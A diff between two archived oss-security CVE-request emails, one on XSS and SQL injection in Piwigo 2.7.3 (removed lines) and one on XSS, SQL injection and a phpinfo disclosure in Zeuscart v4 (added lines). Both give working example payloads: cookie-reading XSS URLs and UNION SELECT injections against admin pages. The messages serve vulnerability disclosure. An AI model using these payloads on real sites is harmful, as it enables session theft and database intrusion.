@@ -1,60 +1,104 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2015/02/18/8
-Message-ID: <CALH-=7xku+asYCkFtNb6qzdrxbghFyUp8zN3HfUxKohRcwBLsg@mail.gmail.com>
-Date: Wed, 18 Feb 2015 16:38:35 +0100
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2015/02/23/2
+Message-ID: <CALH-=7zMVWB0AckWwmAGjHi0npUqeqOmvF=GPfakNh__qPacpA@mail.gmail.com>
+Date: Mon, 23 Feb 2015 05:54:30 +0100
 From: Steffen Rösemann <steffen.roesemann1986@...il.com>
 To: oss-security@...ts.openwall.com
-Subject: CVE-Request -- Piwigo <= v. 2.7.3 -- Reflecting XSS- and SQLi-vulnerability in administrative backend
+Subject: CVE-Request -- Zeuscart v. 4 -- Multiple reflecting XSS-, SQLi and InformationDisclosure-vulnerabilities
 Content-Type: text/plain; charset=utf-8
 
-Hi Steve, Josh, vendors, list.
+Hello Steve, Josh, vendors, list.
 
-I found a reflecting XSS- and a SQL injection-vulnerability in the
-administrative backend of Piwigo <= v. 2.7.3.
+I found multiple reflecting XSS-, SQLi- and
+InformationDisclosure-vulnerabilities in ECommerce Shopping-Cart Zeuscart
+v.4.
 
-The reflecting XSS vulnerability resides in the "page" parameter used in
-the file admin.php which can be found in the administrative backend located
-here in a common Piwigo installation:
+====
+XSS
+====
 
-http://{TARGET}/admin.php?page=plugin-AdminTools
+Reflecting XSS-vulnerabilities can be found in a common
+Zeuscart-installation in the following locations and could be exploited for
+example by crafting a link and make a registered user click on that link.
+
+The parameter "search", which is used in the index.php is vulnerable to
+XSS-attacks.
 
 Exploit-Example:
 
 http://
-{TARGET}/admin.php?page=plugin-AdminTools%3Cimg%20src=n%20onerror=eval%28String.fromCharCode%2897,108,101,114,116,40,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,41,59%29%29%20%3E
+{TARGET}/index.php?do=search&search=%22%3E%3Cbody%20onload=eval%28alert%28document.cookie%29%29%20%3E%3C!--
 
-The SQL injection vulnerability can as well be found in the administrative
-backend and can be found in the "History" functionality located here:
 
-http://{TARGET}/admin.php?page=history
-
-The SQL injection vulnerability can be exploited by appending arbitrary SQL
-statements in a POST request to the parameter "user":
+By appending arbitrary HTML- and/or JavaScript-code to the parameter
+"schltr" which is as well used in index.php, an attacker could exploit this
+XSS-vulnerable parameter:
 
 Exploit-Example:
 
-POST /piwigo/admin.php?page=history HTTP/1.1
-Host: localhost
-User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:31.0) Gecko/20100101
-Firefox/31.0 Iceweasel/31.3.0
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
-Accept-Language: en-US,en;q=0.5
-Accept-Encoding: gzip, deflate
-Referer: http://localhost/piwigo/admin.php?page=history&search_id=82
-Cookie: pwg_display_thumbnail=no_display_thumbnail;
-pwg_id=19rpao6bhdsn3l0u0o1im4m680;
-_pk_id.1.1fff=7588ea02f4577539.1420720532.1.1420720532.1420720532.
-Connection: keep-alive
-Content-Type: application/x-www-form-urlencoded
-Content-Length: 255
+http://
+{TARGET}/index.php?do=brands&schltr=All%3Cbody%20onload=eval%28alert%28String.fromCharCode%2888,83,83%29%29%29%20%3E
 
-start=2015-01-08+&end=2015-01-09+&types%5B%5D=none&types%5B%5D=picture&types%5B%5D=high&types%5B%5D=other&user=2)
-AND 1=2 UNION SELECT user(),database(),3,version(),5,6,7,8,9 --
-&image_id=&filename=&ip=&display_thumbnail=no_display_thumbnail&submit=Submit
 
-The issue has been fixed in version 2.7.4, released on 17th February 2015.
+The third XSS-vulnerability can be found in the "brand"-parameter, which is
+again used in index.php.
 
-Can I have a CVE-ID for it?
+Exploit-Example:
+
+http://
+{TARGET}/index.php?do=viewbrands&brand=Bata%3Cbody%20onload=eval%28alert%28String.fromCharCode%2888,83,83%29%29%29%20%3E
+
+
+====
+SQLi
+====
+
+The SQL injection-vulnerabilities can be found in the administrative
+backend of Zeuscart v. 4 and reside in the following locations in a common
+installation.
+
+By appending arbitrary SQL statements to the "id"-parameter, an attacker
+could exploit this SQL injection vulnerability:
+
+Exploit-Example:
+
+http://
+{TARGET}/admin/?do=disporders&action=detail&id=1+and+1=2+union+select+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,database%28%29,34,35,version%28%29,37,38+--+
+
+
+Another SQL injection vulnerability can be found here and can be exploited
+by appending SQL statements to the vulnerable "cid"-parameter:
+
+Exploit-Example:
+
+http://
+{TARGET}/admin/?do=editcurrency&cid=1+and+1=2+union+select+1,database%28%29,3,version%28%29,5+--+
+
+
+The last SQL injection vulnerability I found can be found in the following
+location and can be exploited by appending SQL statements to the vulnerable
+"id" parameter:
+
+http://
+{TARGET}/admin/?do=subadminmgt&action=edit&id=1+and+1=2+union+select+1,version%28%29,3,database%28%29,5+--+
+
+
+==============
+Information Disclosure
+==============
+
+The administrative backend of Zeuscart v. 4 allows the admin to use a
+functionality, which displays the PHP-installation settings via phpinfo():
+
+http://{TARGET}/admin/?do=getphpinfo
+
+Unfortunately, the PHP-script does not check, if an authorized admin
+executes this functionality: It is possible even for unregistered users to
+request the above link to see the informations, phpinfo() displays. That
+could expose sensitive informations to an attacker which could lead to
+further exploitation.
+
+Can I have a CVE-ID / CVE-IDs for these issues?
 
 Thank you very much.
 
@@ -64,11 +108,10 @@ Steffen Rösemann
 
 References:
 
-
-[1] http://piwigo.org
-[2] http://sroesemann.blogspot.de/2015/01/sroeadv-2015-06.html
-[3] http://piwigo.org/forum/viewtopic.php?id=25179
-[4]
-http://sroesemann.blogspot.de/2015/02/report-for-advisory-sroeadv-2015-06.html
-[5] http://seclists.org/fulldisclosure/2015/Feb/73
+[1] http://zeuscart.com/
+[2] https://github.com/ZeusCart/zeuscart
+[3] https://github.com/ZeusCart/zeuscart/issues/28
+[4] http://sroesemann.blogspot.de/2015/01/sroeadv-2015-12.html
+[5] https://github.com/sroesemann/zeuscart
+[6] http://seclists.org/fulldisclosure/2015/Feb/89
 
